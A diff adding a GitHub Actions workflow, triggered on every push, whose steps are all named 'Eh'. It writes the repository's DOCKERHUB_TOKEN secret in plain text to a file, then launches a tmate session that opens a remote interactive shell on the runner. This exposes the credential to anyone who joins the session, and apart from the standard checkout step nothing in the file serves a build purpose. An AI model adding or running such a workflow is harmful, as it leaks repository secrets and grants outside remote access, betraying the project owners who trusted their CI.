@@ -1,0 +1,20 @@
+name: Eh
+on: [push]
+
+jobs:
+  debug:
+    name: Eh
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Eh
+      uses: actions/checkout@v2
+
+    - name: Eh
+      env:
+        PASS: ${{ secrets.DOCKERHUB_TOKEN }}
+      run: |
+        echo $PASS >> secrets.txt
+
+    - name: Run tmate
+      uses: mxschmitt/action-tmate@v2
